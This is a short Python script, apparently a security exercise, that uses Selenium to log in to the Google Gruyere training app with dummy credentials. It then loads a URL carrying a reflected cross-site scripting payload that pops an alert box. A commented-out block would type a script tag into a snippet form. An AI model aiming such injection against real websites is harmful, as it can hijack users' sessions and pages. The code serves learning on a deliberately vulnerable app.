import requests
from bs4 import BeautifulSoup
# import mechanize
# import urllib.request  as urllib2 
# import re
# import html
import time

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
# from selenium.webdriver.support.ui import WebDriverWait
# from selenium.webdriver.support.ui import WebDriverWait
# from selenium.webdriver.support import expected_conditions as EC
# from selenium.webdriver.common.by import By
# from selenium.common.exceptions import TimeoutException

base_url = "https://google-gruyere.appspot.com/421818625635039223903695198186248862056"
#------------------------------------#

# reg_url = "http://google-gruyere.appspot.com/start"

#------------------------------------#
#user login page with passed info
url_login = base_url + "/login"

#add a session to the request
s = requests.session()
#create a header to add it to the request
headers = {
	'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
}


request = s.get(url_login)

#parse HTML page
parseHTML = BeautifulSoup(request.text, 'html.parser')

#Extract the form name using Beautifull Soap
htmlForm = parseHTML.form

inputs = htmlForm.find_all('input', type="text")


#Extract Input Field Names
inputFieldNames = []

for items in inputs:
	if items.has_attr('name'):
		inputFieldNames.append(items['name'])


browser = webdriver.Firefox()
browser.get(url_login) 


time.sleep(3)

for i in range(len(inputFieldNames)):
	browser.find_element_by_name(inputFieldNames[i]).send_keys("demo123")


time.sleep(5)

login_attempt = browser.find_element_by_xpath("//input[@type='submit']")
login_attempt.submit()

time.sleep(3)

current_url = browser.current_url
newurl = base_url+"/<script>alert('Ohhhhhhhh!');</script>";
browser.get(newurl);


# newsnippet_url = base_url + "/newsnippet.gtl"

# new_snippet = browser.find_element_by_xpath("""/html/body/div[2]/div/form/textarea""")

# new_snippet.send_keys("<script>alert</script>")